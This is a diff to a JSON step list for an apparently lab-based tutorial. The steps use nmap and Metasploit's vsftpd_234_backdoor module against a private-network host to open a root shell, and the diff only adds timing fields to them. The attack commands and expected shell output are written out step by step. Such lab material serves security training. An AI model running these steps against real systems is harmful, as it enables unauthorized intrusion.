@@ -12,18 +12,21 @@
       "title": "Verify the target is running",
       "command": "nmap -sV 172.20.0.15 -p 21",
       "explanation": "This scans port 21 (FTP) and identifies the service version. Look for 'vsftpd 2.3.4'.",
-      "expected": "You should see: 21/tcp open ftp vsftpd 2.3.4"
+      "expected": "You should see: 21/tcp open ftp vsftpd 2.3.4",
+      "duration": "5-10 sec"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "The -q flag skips the banner for faster startup. Wait for the msf6 > prompt."
+      "explanation": "The -q flag skips the banner for faster startup. Wait for the msf6 > prompt.",
+      "duration": "5-15 sec"
     },
     {
       "title": "Search for the exploit",
       "command": "search vsftpd",
       "explanation": "This searches Metasploit's database for vsftpd-related modules.",
-      "expected": "You'll see exploit/unix/ftp/vsftpd_234_backdoor in the results"
+      "expected": "You'll see exploit/unix/ftp/vsftpd_234_backdoor in the results",
+      "duration": "1-2 sec"
     },
     {
       "title": "Load the exploit module",
@@ -45,7 +48,8 @@
       "title": "Execute the exploit",
       "command": "run",
       "explanation": "This triggers the backdoor and opens a shell session.",
-      "expected": "[*] Command shell session 1 opened"
+      "expected": "[*] Command shell session 1 opened",
+      "duration": "2-5 sec"
     },
     {
       "title": "Verify root access",
